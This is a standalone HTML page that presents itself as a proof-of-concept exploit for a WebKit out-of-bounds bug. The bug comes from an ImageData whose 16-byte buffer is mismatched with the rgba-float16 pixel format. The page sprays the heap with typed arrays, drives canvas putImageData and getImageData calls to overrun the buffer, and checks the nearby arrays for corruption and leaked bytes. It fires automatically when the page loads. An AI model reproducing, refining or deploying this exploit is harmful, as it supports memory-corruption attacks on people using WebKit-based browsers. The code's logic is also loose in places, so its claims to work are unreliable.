<!DOCTYPE html>
<html>
<head>
    <title>WebKit OOB Primitive - Stride Mismatch</title>
</head>
<body style="background-color: #1e1e1e; color: #00ff00; font-family: monospace;">
    <h2>WebKit Native Stride OOB Primitive Construction</h2>
    <div id="status">Initializing heap layout...</div>
    <canvas id="cvs" width="16" height="16"></canvas>

    <script>
        const statusDiv = document.getElementById("status");

        function log(msg, color = "#00ff00") {
            statusDiv.innerHTML += `<div style="color: ${color};">${msg}</div>`;
            console.log(msg);
        }

        function triggerOOBPrimitive() {
            try {
                log("[*] Step 1: Allocating heap spray / grooming objects...");
                
                // Grooming objects: create an array of TypedArrays to place adjacent in the WebKit heap
                let floatArrays = [];
                let targetBuffers = [];
                
                for (let i = 0; i < 500; i++) {
                    let buf = new ArrayBuffer(64);
                    targetBuffers.push(buf);
                    floatArrays.push(new Float32Array(buf));
                }

                log("[*] Step 2: Creating vulnerable ImageData with stride mismatch...");
                // 4 bytes backing store, forced to float16 format (demands 8 bytes per pixel stride)
                let vulnArray = new Uint8ClampedArray(16);
                // Fill with a distinct pattern to track overflow corruption
                for(let i=0; i<vulnArray.length; i++) vulnArray[i] = 0x41;

                let imgData = new ImageData(vulnArray, 2, 2, { colorSpace: "srgb", pixelFormat: "rgba-float16" });

                log("[*] Step 3: Triggering native canvas operations to force stride overrun...");
                const canvas = document.getElementById("cvs");
                const ctx = canvas.getContext("2d", { willReadFrequently: true });

                // Put the mismatched ImageData onto the canvas
                ctx.putImageData(imgData, 0, 0);

                // Read back using getImageData to force native C++ engine to read past the 16-byte buffer boundary
                let leakedData = ctx.getImageData(0, 0, 2, 2);
                let leakedBytes = leakedData.data;

                log("[*] Step 4: Inspecting readback for adjacent heap data corruption...");
                let corruptedIndex = -1;
                for (let i = 0; i < floatArrays.length; i++) {
                    // Check if any Float32Array length or contents have been modified by the overrun
                    if (floatArrays[i][0] !== 0) {
                        corruptedIndex = i;
                        break;
                    }
                }

                if (corruptedIndex !== -1) {
                    log(`[+] SUCCESS: Adjacent object corruption detected at index ${corruptedIndex}!`, "#ff0000");
                    log(`[+] OOB Data Leaked: ${Array.from(leakedBytes).slice(0, 16).map(b => b.toString(16)).join(' ')}`);
                } else {
                    log("[-] No immediate corruption detected in target array pool. Adjusting heap layout...", "orange");
                }

            } catch (err) {
                log(`[!] Execution Error: ${err.message}`, "#ff0000");
            }
        }

        window.onload = () => {
            setTimeout(triggerOOBPrimitive, 500);
        };
    </script>
</body>
</html>
